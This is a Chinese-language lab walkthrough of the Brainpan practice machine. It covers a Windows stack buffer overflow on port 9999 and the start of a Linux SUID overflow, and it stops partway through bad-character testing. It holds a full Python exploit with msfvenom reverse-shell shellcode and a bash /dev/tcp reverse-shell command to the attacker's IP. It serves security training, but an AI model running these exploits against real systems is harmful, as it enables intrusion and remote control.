## 前言

最近想尝试玩下 OSCP，网上找了类 OSCP 靶机来练练手。其中找到了这台靶机 brainpan。该靶机为缓冲区溢出类型的靶机。下面将会详细讲讲其中
windows 缓冲区溢出 和 linux 缓冲区溢出的操作方式，以及一些技巧和操作。

话不多说，直入主题。玩靶机，上来第一步当然是 nmap 一把梭

nmap 结果：

    
    
    9999/tcp  open  abyss?
    | fingerprint-strings: 
    |   NULL: 
    |     _| _| 
    |     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
    |     _|_| _| _| _| _| _| _| _| _| _| _| _|
    |     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
    |     [________________________ WELCOME TO BRAINPAN _________________________]
    |_    ENTER THE PASSWORD
    10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port9999-TCP:V=7.91%I=7%D=11/24%Time=5FBD0DD8%P=x86_64-pc-linux-gnu%r(N
    SF:ULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
    SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\
    SF:|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20
    SF:\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\
    SF:x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
    SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
    SF:x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\
    SF:|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\
    SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\
    SF:x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\
    SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20
    SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\
    SF:x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
    SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x
    SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
    SF:\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\
    SF:x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\
    SF:x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
    SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
    MAC Address: 00:0C:29:EF:93:01 (VMware)
    Device type: general purpose
    Running: Linux 2.6.X|3.X

这明显一看就不是正常的 Web类型靶机。

## 初探

使用 nc 分别访问 9999 端口 和 10000 端口

 **9999端口：**

![1606788199_5fc5a467079016c224fb3.png!small?1606788199945](https://image.3001.net/images/20201201/1606788199_5fc5a467079016c224fb3.png!small?1606788199945)

 **10000端口：**

![1606788220_5fc5a47cdff6dea05aa02.png!small?1606788221924](https://image.3001.net/images/20201201/1606788220_5fc5a47cdff6dea05aa02.png!small?1606788221924)

发现 9999 端口可以输入密码然后进行校验。

而 10000 端口应该是个 web

既然有web？去瞄瞄看吧。

结果发现是一个静态网页

![1606788238_5fc5a48e5bbc288ab13ef.png!small?1606788239486](https://image.3001.net/images/20201201/1606788238_5fc5a48e5bbc288ab13ef.png!small?1606788239486)

没有什么惊喜啊。试试爆破下路径吧，上 dirb：

    
    
    dirb http://10.10.10.131:10000/ -r

发现一个 bin 目录

    
    
    + http://10.10.10.131:10000/bin (CODE:301|SIZE:0)                                                                          
    + http://10.10.10.131:10000/index.html (CODE:200|SIZE:215)

访问下 bin 目录，发现里面有一个 exe 文件：

![1606788300_5fc5a4cc2344eb15e34a2.png!small?1606788301212](https://image.3001.net/images/20201201/1606788300_5fc5a4cc2344eb15e34a2.png!small?1606788301212)

存在可执行程序

有奇怪的非web端口 9999，用户可输入内容

几点要素结合下，哎，莫非这是道 pwn 题？

虽然这是 exe 文件。 **linux 下跑 exe 文件可以用 wine** 。所以。。不足为奇不足为奇

再开台 win虚拟机，装好 Immunity Debugger。下载 exe 文件运行。发现确实就是靶机上 9999 端口的文件。

## 缓冲区溢出调试

编写发包脚本

简单写一个 python 文件，用于对 9999 端口程序进行发包

    
    
    import socket
    a = "123456"
    s = socket.socket()
    s.connect(('10.10.10.133',9999))
    r = s.recv(1024)
    print(r)
    s.send(a)
    r = s.recv(1024)
    print(r)
    s.close()

![1606788346_5fc5a4fa55cf9a43bbde1.png!small?1606788347328](https://image.3001.net/images/20201201/1606788346_5fc5a4fa55cf9a43bbde1.png!small?1606788347328)

![1606788352_5fc5a5008364db6611d4e.png!small?1606788353554](https://image.3001.net/images/20201201/1606788352_5fc5a5008364db6611d4e.png!small?1606788353554)

基本的发包可以了，接下来开始缓冲区溢出的 **基本流程** ：

 **确定溢出大小 - > 控制 eip **

**- > 寻找 jmp esp -> 测试坏字符**

 **- > 生成shellcode -> 添加适量的nop **

**- > 开始攻击**

### 确定溢出大小

我们可以先用 "A" 字符，测试大概在多长程序会崩溃，以便确定这是不是一个有漏洞的程序：

    
    
    import socket
    a = "A"*2000  #先给他打个2k字符过去
    s = socket.socket()
    s.connect(('10.10.10.133',9999))
    r = s.recv(1024)
    s.send(a)
    s.close()

在 windows 中，使用 im attach 住 9999 端口的程序

    
    
    File -> Attach

选择 9999 端口程序，程序名为“ **brainpan** ”

选择完毕后记得要点 “ **运行** ”（Run）

![1606788464_5fc5a570e7197a1d5f556.png!small?1606788465959](https://image.3001.net/images/20201201/1606788464_5fc5a570e7197a1d5f556.png!small?1606788465959)

看到右下角的状态由 “ **Pause** ” 变成 “ **Running** ” 即可。

在 kali 中运行 python 脚本后，im 中发现 eip 成功被覆盖：

![1606788490_5fc5a58a3761f169559bf.png!small?1606788491217](https://image.3001.net/images/20201201/1606788490_5fc5a58a3761f169559bf.png!small?1606788491217)

这时可以确定，该程序有缓冲区溢出漏洞。

关闭9999端口程序，重新再开。并且重新再打开 im 再 attach（好像每次都得这样子弄，，，有点麻烦。。。）

这次为了确定漏洞溢出点的长度。可以将工具 **msf-pattern_create** 和 **msf-pattern_offset**
配合使用。第一个工具是用来生成指定长度的唯一字符串，第二个工具用于判断在这唯一字符串中，溢出点到覆盖 eip 的长度

首先生成 2000 长度的 payload：

    
    
    msf-pattern_create -l 2000

![1606788528_5fc5a5b069f2566871034.png!small?1606788529531](https://image.3001.net/images/20201201/1606788528_5fc5a5b069f2566871034.png!small?1606788529531)

复制到 python 脚本中。运行之。

在 windows im 中看到 eip 的值，这个值就是在生成的 2000字符的字符串中，和别的字符串不重复的字符串。

![1606788540_5fc5a5bc76d359c450f66.png!small?1606788541457](https://image.3001.net/images/20201201/1606788540_5fc5a5bc76d359c450f66.png!small?1606788541457)

得到字符串

    
    
    35724134

根据这个不重复的字符串，我们可以使用 msf-pattern_offset 判断溢出长度：

    
    
    msf-pattern_offset -l 2000 -q 35724134

![1606788588_5fc5a5ecd52e8761a270e.png!small?1606788589891](https://image.3001.net/images/20201201/1606788588_5fc5a5ecd52e8761a270e.png!small?1606788589891)

得到溢出长度为 **524** 个字符。

### 控制 eip

根据上面得到的溢出长度，修改 python 脚本，试验下长度是否正确：

    
    
    import socket
    a = "A"*524 + "BBBB"
    s = socket.socket()
    s.connect(('10.10.10.133',9999))
    r = s.recv(1024)
    s.send(a)
    s.close()

发现 **eip** 的值成功被修改为 **42424242** ：

![1606788667_5fc5a63bb08ac140c3f5d.png!small?1606788668760](https://image.3001.net/images/20201201/1606788667_5fc5a63bb08ac140c3f5d.png!small?1606788668760)

此时我们便可以控制 eip 的值了。

### 寻找 jmp esp

在 im 中安装 **mona** 插件

网上下载 mona.py ，然后丢到 im 安装目录下的 **PyCommands** 目录下即可

装好 mona 插件后。首先，查看当前加载了哪些库（记得首先得 run 起来）

    
    
    !mona modules

该命令会调出一个 “Log data” 的窗口。里面将有详细加载了的库的信息

![1606788740_5fc5a684dd2991a086fd4.png!small?1606788742380](https://image.3001.net/images/20201201/1606788740_5fc5a684dd2991a086fd4.png!small?1606788742380)

由于具有漏洞的程序所在的系统环境很可能和我们实验时的系统环境不一样，所以加载的库的位置也可能会不一样。为求最稳的库，我们尽量使用 **漏洞程序 自带**
的库。

根据上图可以发现，漏洞程序自带的库就是其 exe文件，所以我们就在 漏洞程序的 exe文件中寻找 jmp esp 的位置。 **jmp esp**
的机器码为 **\xff\xef**

    
    
    !mona find -s "\xff\xe4" -m "brainpan.exe"

![1606789588_5fc5a9d4b9a7597373a82.png!small?1606789589988](https://image.3001.net/images/20201201/1606789588_5fc5a9d4b9a7597373a82.png!small?1606789589988)

如上图，成功找到 jmp esp，位置为

    
    
    0x311712f3

拿到 jmp esp之后，我们还可以测试下。

首先，点击蓝色跳转按钮：

![1606789690_5fc5aa3a893a5ff373b27.png!small?1606789691585](https://image.3001.net/images/20201201/1606789690_5fc5aa3a893a5ff373b27.png!small?1606789691585)

输入要跳转的地址位置

![1606789697_5fc5aa41e68c5c2459b11.png!small?1606789698936](https://image.3001.net/images/20201201/1606789697_5fc5aa41e68c5c2459b11.png!small?1606789698936)

点击 ok 键，如果第一次没跳到 jmp esp的位置，再跳一次即可

![1606789705_5fc5aa4945c8672c71cbd.png!small?1606789706711](https://image.3001.net/images/20201201/1606789705_5fc5aa4945c8672c71cbd.png!small?1606789706711)

找到 jmp esp 位置后。我们下一个断点。按 f2 键。 im 将会高亮显示

![1606789713_5fc5aa51722ec77d4c6a1.png!small?1606789714472](https://image.3001.net/images/20201201/1606789713_5fc5aa51722ec77d4c6a1.png!small?1606789714472)

修改 python 脚本进行测试： **如果能够成功 jmp esp，则将能在 im 中看到程序走到了 nop 中**

 **备注** ：jmp esp 压栈的时候需要倒着压入，因为栈内容的压入是从高到低排列的。但读取顺序是从低到高。所以我们需要倒着压入。即
**\x31\x17\x12\xf3** 改为 **\xf3\x12\x17\x31**

    
    
    import socket
    # 0x311712f3
    a = "A"*524 + "\xf3\x12\x17\x31" + "\x90"*8
    s = socket.socket()
    s.connect(('10.10.10.133',9999))
    r = s.recv(1024)
    s.send(a)
    s.close()

发包测试，在 im 中按 f7 进入下一步

![1606789763_5fc5aa83528b57d2eb155.png!small?1606789764398](https://image.3001.net/images/20201201/1606789763_5fc5aa83528b57d2eb155.png!small?1606789764398)

可以发现，jmp esp 成功 跳入了 nop 的位置。

目前为止，可以说 getshell 已经是唾手可得了。毕竟整个程序的流程都能被我们所控制

### 测试坏字符

坏字符是一定要测试的。不然到时 shellcode 可能会出现无法正常执行的情况。

  

所谓坏字符就是，本意是 A 的机器码发送到服务端，服务端存入内存时却变成了 B。

这就很不好了，比方说我想执行的shellcode 为 0a，但存入内存中后啪的一下变成了 00，这就很不好了，shellcode就不是我们原来正常的逻辑了。

所以我们需要在shellcode之前加多一个解码器，先将我们的shellcode编码成非 坏字符，比如 0a 变成 0b。此时内存正常写入了一个 0b

加载shellcode时，先跑解码器，将 0b 还原成 0a

此时再跑shellcode，shellcode的逻辑就正常了。

很幸运，msfvenom 中 可以直接帮我们把 解码器写进 shellcode 里面

或者是一些具有特殊含义的，如 00 为字符串终止符。0a 0d 为 http 中的换行符等。

  

为了验证坏字符的存在。我们可以先生成一串 **有序的** 从 00 一直到 ff 的字符串，然后将其发送到漏洞程序中，在 im
中看内存。看看是否有解析错误的字符。这里就要考眼力一个个看了。一般也挺明显的。如：

    
    
    2a2b2c000000

在字符串有序的情况下，这样就一眼看出是 2d 是个坏字符

或者有稍微难看一点的

    
    
    3a3b3c103f4041

这里是 3d 变成了 10。这种就稍微难看出来一些

我这里写了几个小 python 脚本，用于测试坏字符。

首先要验证坏字符，得生成 00 - ff 的字符串。python如下：

    
    
    a = '0123456789ABCDEF'
    for i in range(len(a)):
            for j in range(len(a)):
                    print('\\x'+a[i]+a[j],end='')

注：需要使用 python3 运行。

![1606789887_5fc5aaff7f971d1aa0582.png!small?1606789888620](https://image.3001.net/images/20201201/1606789887_5fc5aaff7f971d1aa0582.png!small?1606789888620)

将这些字符复制到 python脚本中去。我们可以先删除掉一些常见的坏字符：

    
    
    \x00\x0a\x0d

代码：

    
    
    import socket
    # 0x311712f3
    a = "A"*524 + "\xf3\x12\x17\x31" + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF"
    # \x00\x0a\x0d
    s = socket.socket()
    s.connect(('10.10.10.133',9999))
    r = s.recv(1024)
    s.send(a)
    s.close()

发包，im中查看 esp 的内存：

![1606789987_5fc5ab639fbd8446313ed.png!small?1606789988786](https://image.3001.net/images/20201201/1606789987_5fc5ab639fbd8446313ed.png!small?1606789988786)

此时便可以看到我们的字符。

![1606789997_5fc5ab6d7f866e29f06fc.png!small?1606789998541](https://image.3001.net/images/20201201/1606789997_5fc5ab6d7f866e29f06fc.png!small?1606789998541)

但是人眼看太难受了。写了个小脚本来自动检测是否有坏字符。

首先需要把靶机内存中的 hex 值拷贝出来

![1606790031_5fc5ab8fe7e122a6d64ea.png!small?1606790033032](https://image.3001.net/images/20201201/1606790031_5fc5ab8fe7e122a6d64ea.png!small?1606790033032)

可以用 sublime 进行多行处理：

ctrf+f 搜索 00

选择 find all

即可在每一行有光标

![1606790046_5fc5ab9e1d097301f099c.png!small?1606790047206](https://image.3001.net/images/20201201/1606790046_5fc5ab9e1d097301f099c.png!small?1606790047206)

将这些 hex 值抽出来，变成如下格式：

![1606790057_5fc5aba9958774844fa6a.png!small?1606790058807](https://image.3001.net/images/20201201/1606790057_5fc5aba9958774844fa6a.png!small?1606790058807)

对应填入到检测坏字符的python脚本中：

rightChars 为发送时的 bad chars list

memeryChars 为发送后，在服务端内存中的 bad chars list

    
    
    rightChars = "The correct Chars list in your exp"
    memeryChars = "The Chars list in the target machine memery dump"
    flag = 1
    for i in range(len(memeryChars)):
    	if rightChars[i] != memeryChars[i]:
    		print("[-] Find bad char!")
    		print("[-] Current char: " + hex(ord(rightChars[i])))
    		if i != 0:
    			print("[-] Previous char: " + hex(ord(rightChars[i-1])))
    		flag = 0
    		break
    if flag == 1:
    	print("[+] Not Find bad char!")

brainpan 的程序中，badchars 很少，在剔除了 \x00\x0a\x0d 这三个最常见的坏字符后，脚本没有检测到其他坏字符：

![1606790106_5fc5abda04186a10c466b.png!small?1606790106983](https://image.3001.net/images/20201201/1606790106_5fc5abda04186a10c466b.png!small?1606790106983)

### 生成shellcode

直接 msfvenom 一把梭就是干：

注意由于有坏字符，所以需要一个编码器。

    
    
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.129 LPORT=8888 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python

将生成的 shellcode 填入 python 脚本中：

    
    
    import socket
    buf =  b""
    buf += b"\xdb\xdd\xd9\x74\x24\xf4\x58\xbb\x7d\xe2\x11\xc5\x31"
    buf += b"\xc9\xb1\x52\x31\x58\x17\x83\xc0\x04\x03\x25\xf1\xf3"
    buf += b"\x30\x29\x1d\x71\xba\xd1\xde\x16\x32\x34\xef\x16\x20"
    buf += b"\x3d\x40\xa7\x22\x13\x6d\x4c\x66\x87\xe6\x20\xaf\xa8"
    buf += b"\x4f\x8e\x89\x87\x50\xa3\xea\x86\xd2\xbe\x3e\x68\xea"
    buf += b"\x70\x33\x69\x2b\x6c\xbe\x3b\xe4\xfa\x6d\xab\x81\xb7"
    buf += b"\xad\x40\xd9\x56\xb6\xb5\xaa\x59\x97\x68\xa0\x03\x37"
    buf += b"\x8b\x65\x38\x7e\x93\x6a\x05\xc8\x28\x58\xf1\xcb\xf8"
    buf += b"\x90\xfa\x60\xc5\x1c\x09\x78\x02\x9a\xf2\x0f\x7a\xd8"
    buf += b"\x8f\x17\xb9\xa2\x4b\x9d\x59\x04\x1f\x05\x85\xb4\xcc"
    buf += b"\xd0\x4e\xba\xb9\x97\x08\xdf\x3c\x7b\x23\xdb\xb5\x7a"
    buf += b"\xe3\x6d\x8d\x58\x27\x35\x55\xc0\x7e\x93\x38\xfd\x60"
    buf += b"\x7c\xe4\x5b\xeb\x91\xf1\xd1\xb6\xfd\x36\xd8\x48\xfe"
    buf += b"\x50\x6b\x3b\xcc\xff\xc7\xd3\x7c\x77\xce\x24\x82\xa2"
    buf += b"\xb6\xba\x7d\x4d\xc7\x93\xb9\x19\x97\x8b\x68\x22\x7c"
    buf += b"\x4b\x94\xf7\xd3\x1b\x3a\xa8\x93\xcb\xfa\x18\x7c\x01"
    buf += b"\xf5\x47\x9c\x2a\xdf\xef\x37\xd1\x88\x05\xc2\xd3\xc9"
    buf += b"\x72\xd0\xe3\xeb\x3a\x5d\x05\x81\x2a\x08\x9e\x3e\xd2"
    buf += b"\x11\x54\xde\x1b\x8c\x11\xe0\x90\x23\xe6\xaf\x50\x49"
    buf += b"\xf4\x58\x91\x04\xa6\xcf\xae\xb2\xce\x8c\x3d\x59\x0e"
    buf += b"\xda\x5d\xf6\x59\x8b\x90\x0f\x0f\x21\x8a\xb9\x2d\xb8"
    buf += b"\x4a\x81\xf5\x67\xaf\x0c\xf4\xea\x8b\x2a\xe6\x32\x13"
    buf += b"\x77\x52\xeb\x42\x21\x0c\x4d\x3d\x83\xe6\x07\x92\x4d"
    buf += b"\x6e\xd1\xd8\x4d\xe8\xde\x34\x38\x14\x6e\xe1\x7d\x2b"
    buf += b"\x5f\x65\x8a\x54\xbd\x15\x75\x8f\x05\x25\x3c\x8d\x2c"
    buf += b"\xae\x99\x44\x6d\xb3\x19\xb3\xb2\xca\x99\x31\x4b\x29"
    buf += b"\x81\x30\x4e\x75\x05\xa9\x22\xe6\xe0\xcd\x91\x07\x21"
    # 0x311712f3
    a = "A"*524 + "\xf3\x12\x17\x31" + buf
    # \x00\x0a\x0d
    s = socket.socket()
    s.connect(('10.10.10.133',9999))
    r = s.recv(1024)
    s.send(a)
    s.close()

看起来似乎很完美，在 im 中对 jmp esp 下断点进行测试

发现并没有如愿以偿的 getshell。究其原因，是因为编码器需要在内存中进行异或之类的解码操作。 **启动但还未开始正式解码shellcode时**
，影响到 **前面的字符** 。就好巧不巧刚好 **改烂了我们的shellcode** ，自然不能正确的运行shellcode：

执行shellcode 前：

![1606790159_5fc5ac0f81fac71444dad.png!small?1606790160563](https://image.3001.net/images/20201201/1606790159_5fc5ac0f81fac71444dad.png!small?1606790160563)

执行shellcode后：

![1606790175_5fc5ac1f862eebf79ff5f.png!small?1606790176625](https://image.3001.net/images/20201201/1606790175_5fc5ac1f862eebf79ff5f.png!small?1606790176625)

这就难受了，思索一阵，其实我们可以用 nop 填充啊，用 nop 把 shellcode 隔远点，shellcode 就不会被解码器影响到了。

### 添加适量的nop

我们在原来 exp 的的基础上增加40个nop：

    
    
    a = "A"*524 + "\xf3\x12\x17\x31" + "\x90"*40 + buf

重新测试，发现解码器仅仅只覆盖了 nop 的值，而不会覆盖 shellcode：

![1606790566_5fc5ada6e43a6bbf5a466.png!small?1606790568066](https://image.3001.net/images/20201201/1606790566_5fc5ada6e43a6bbf5a466.png!small?1606790568066)

十分奈斯，直接点击运行按钮，放开让其跑

![1606790576_5fc5adb07ec26be01a3ad.png!small?1606790577559](https://image.3001.net/images/20201201/1606790576_5fc5adb07ec26be01a3ad.png!small?1606790577559)

过了一阵，成功获取反弹shell

![1606790593_5fc5adc1bcced63eef628.png!small?1606790594856](https://image.3001.net/images/20201201/1606790593_5fc5adc1bcced63eef628.png!small?1606790594856)

## 逃逸 wine

上一步我们只是打到了我们的测试机器，现在要打真正的靶机。

修改 python 脚本的 ip 地址为 brainpan 靶机的地址

    
    
    s.connect(('10.10.10.131',9999))

运行脚本，成功获取 brainpan 的 shell：

![1606790675_5fc5ae135e8f4fd15d723.png!small?1606790676620](https://image.3001.net/images/20201201/1606790675_5fc5ae135e8f4fd15d723.png!small?1606790676620)

可这是一台 linux，接到的 shell 是一个 cmd。而且不是常规的 cmd：

![1606790691_5fc5ae235e586abfc18ec.png!small?1606790692467](https://image.3001.net/images/20201201/1606790691_5fc5ae235e586abfc18ec.png!small?1606790692467)

盲猜这是 wine 程序。我们可以走到 / 目录下。发现是常规的 linux 目录：

![1606790702_5fc5ae2e082a33bb561bd.png!small?1606790703194](https://image.3001.net/images/20201201/1606790702_5fc5ae2e082a33bb561bd.png!small?1606790703194)

走回 /home/puck 目录中，尝试使用以下命令逃逸：

    
    
    /bin/bash -i

发现命令提示符变成了 /bin/bash 的提示符。可是却不能执行命令

![1606790748_5fc5ae5c8020b4ee7fe82.png!small?1606790749723](https://image.3001.net/images/20201201/1606790748_5fc5ae5c8020b4ee7fe82.png!small?1606790749723)

打多几次发现，似乎我们输入的命令有一部分是能逃逸出来的，打多几次就能正确被执行：

![1606790760_5fc5ae682715d3b652085.png!small?1606790761917](https://image.3001.net/images/20201201/1606790760_5fc5ae682715d3b652085.png!small?1606790761917)

尝试反弹shell，毕竟在 wine 环境里太无语了。。：

    
    
    bash -i >& /dev/tcp/10.10.10.129/9999 0>&1

我们先测试下什么时候 能正确执行命令。测试可知，第一次输入的命令不解析，第二次输入的才解析：

![1606790793_5fc5ae89883e11d0d3a00.png!small?1606790794603](https://image.3001.net/images/20201201/1606790793_5fc5ae89883e11d0d3a00.png!small?1606790794603)

尝试在第二次命令输入时，执行反弹 shell 命令，不料命令被拆分了

![1606790805_5fc5ae9552112934cd10a.png!small?1606790806357](https://image.3001.net/images/20201201/1606790805_5fc5ae9552112934cd10a.png!small?1606790806357)

尝试顺着被截断的命令打下去，看看能不能被拼接起来。

最后发现确实是能被拼接的，但是最终命令执行那里发现多了一个1 。。。

![1606790816_5fc5aea07197223b9d0d4.png!small?1606790817571](https://image.3001.net/images/20201201/1606790816_5fc5aea07197223b9d0d4.png!small?1606790817571)

不过，不管怎么说，这个思路是对的，继续尝试

似乎每次被截断的位置都不一样：

![1606791001_5fc5af59de23b2b097d17.png!small?1606791002959](https://image.3001.net/images/20201201/1606791001_5fc5af59de23b2b097d17.png!small?1606791002959)

多次尝试，发现终于可以反弹 shell 了

![1606791015_5fc5af67462c51f12daba.png!small?1606791016423](https://image.3001.net/images/20201201/1606791015_5fc5af67462c51f12daba.png!small?1606791016423)

![1606791021_5fc5af6db4b307516e508.png!small?1606791022819](https://image.3001.net/images/20201201/1606791021_5fc5af6db4b307516e508.png!small?1606791022819)

 **备注：**

zsh 好像不能用 /dev/tcp 来反弹shell

![1606792097_5fc5b3a140e90c464b28c.png!small?1606792098609](https://image.3001.net/images/20201201/1606792097_5fc5b3a140e90c464b28c.png!small?1606792098609)

## 提权

拿到正常的 linux shell后，发现家目录下有一个 checksrv.sh。瞄一瞄这是啥子：

![1606792127_5fc5b3bfeb2ac175712c8.png!small?1606792129111](https://image.3001.net/images/20201201/1606792127_5fc5b3bfeb2ac175712c8.png!small?1606792129111)

确实是用 wine 跑起来的程序。

提权之前，我们先做好信息收集：

首先，查看有没有用 root 权限跑起来的可被我们利用的程序。如 mysql：

    
    
    ps -ef | grep root

找了一圈，发现没有什么可利用的

接着，找 suid 文件：

    
    
    find / -perm -u=s -type f 2>/dev/null

发现了一个可执行程序：

    
    
    /usr/local/bin/validate

简单用用看：

![1606792187_5fc5b3fb88d8bdd7a8a1f.png!small?1606792188654](https://image.3001.net/images/20201201/1606792187_5fc5b3fb88d8bdd7a8a1f.png!small?1606792188654)

看看所属用户：

![1606792213_5fc5b4154e5b37fb78067.png!small?1606792214409](https://image.3001.net/images/20201201/1606792213_5fc5b4154e5b37fb78067.png!small?1606792214409)

这。。。大概率是要把这玩意 pwn 了才能 get 普通的用户的shell了，不过不慌，linux 下 pwn 的步骤和上面 windows 的流程是一致的

### 测试溢出

将 validate 拷贝到 web 目录下，kali将其下载。简单测试是否有 缓冲区溢出：

![1606792238_5fc5b42ee9edc7dedd568.png!small?1606792240079](https://image.3001.net/images/20201201/1606792238_5fc5b42ee9edc7dedd568.png!small?1606792240079)

妥妥的溢出了。接下来上 [edb ](https://github.com/eteran/edb-debugger)调试：

    
    
    python -c 'print("A"*2000)' > 1.txt
    a=`cat 1.txt`
    ./edb --run ./validate $a > 2.txt

发现成功覆盖了 eip:

![1606792308_5fc5b474c160487d91caf.png!small?1606792309780](https://image.3001.net/images/20201201/1606792308_5fc5b474c160487d91caf.png!small?1606792309780)

溢出偏移量

使用 msf-pattern_create 生成填充值写入 txt 文件中，然后像上一步一样运行edb 调用 validate 程序

    
    
    msf-pattern_create -l 2000 > 1.txt

得到覆盖值，丢到 msf-pattern_offset 中看看偏移量：

![1606792407_5fc5b4d7e027ea0040749.png!small?1606792408916](https://image.3001.net/images/20201201/1606792407_5fc5b4d7e027ea0040749.png!small?1606792408916)

结果：

    
    
    [*] Exact match at offset 116

得到偏移值 116。继续构造，找 jmp esp。

### 寻找 jmp esp / eax

在 edb 中 点击 **Plugins - > OpcodeSearcher**。进行搜索操作

发现没有 jmp esp，只有 jmp eax：

![1606792583_5fc5b587697d0edef09dd.png!small?1606792584542](https://image.3001.net/images/20201201/1606792583_5fc5b587697d0edef09dd.png!small?1606792584542)

![1606792593_5fc5b5913f974faad75e8.png!small?1606792594377](https://image.3001.net/images/20201201/1606792593_5fc5b5913f974faad75e8.png!small?1606792594377)

看看 eax 在溢出后，里面的数据是什么：

![1606792615_5fc5b5a78500ac4f3fc88.png!small?1606792616702](https://image.3001.net/images/20201201/1606792615_5fc5b5a78500ac4f3fc88.png!small?1606792616702)

是我们进行缓冲区溢出用于填充的字符。

得到 jmp eax 地址：

    
    
    0x080484af

这里需要注意的是，由于只能 jmp eax。而 eax 的位置是我们的填充字符。能执行到的 shellcode
长度也就是我们填充字符的长度了。上一步测试溢出偏移量时，已经得到偏移量为 116。这说明我们构造的 shellcode 最大长度为 116 。

### 测试坏字符

简单测试下坏字符，可以把常规的 \x00\x0a\x0d 去掉：

    
    
